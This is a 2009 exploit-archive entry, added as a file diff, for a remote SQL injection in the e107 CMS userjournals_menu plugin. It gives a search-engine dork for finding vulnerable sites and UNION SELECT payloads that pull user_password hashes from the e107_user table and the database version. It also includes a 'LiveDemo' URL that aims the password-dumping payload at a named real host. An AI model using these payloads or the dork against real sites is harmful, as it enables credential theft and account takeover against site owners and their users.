@@ -1,0 +1,37 @@
+###################################################################
+e107 Plugin userjournals_menu (blog.id) SQL injection vulnerability 
+###################################################################
+
+
+###################################################
+#[~] Author        :  boom3rang 
+#[~] Greetz        :  H!tm@N, KHG, chs, redc00de
+#[~] Vulnerability :  Remote SQL-injection
+#[~] Google Dork   :  inurl:"userjournals.php?blog."
+--------------------------------------------------   
+#[!] Product Site  :  http://www.bugrain.com
+#[!] Download CMS  :  http://www.e107coders.org/download.php?view.1402
+#[!] Version       :  v0.7 or later
+###################################################
+
+
+[-] POC:
+http://localhost/plugins/userjournals_menu/userjournals.php?blog.[exploit]
+
+[-] Exploit:
+-9999 union all select 1,2,3,4,5,6,user_password,8,9,0,11,12,13 from e107_user--
+
+[-] Exploit 2:
+-9999 union all select 1,2,null,4,5,6,@@version,8,9,0,11,12,13--
+
+[+] LiveDemo:
+http://demo.infozonelab.com/plugins/userjournals_menu/userjournals.php?blog.-9999 union all select 1,2,3,4,5,6,user_password,8,9,0,11,12,13 from e107_user--
+
+
+###########################
+United States of Albania
+Proud to be Albanian
+R.I.P redc00de
+###########################
+
+# milw0rm.com [2009-04-13]
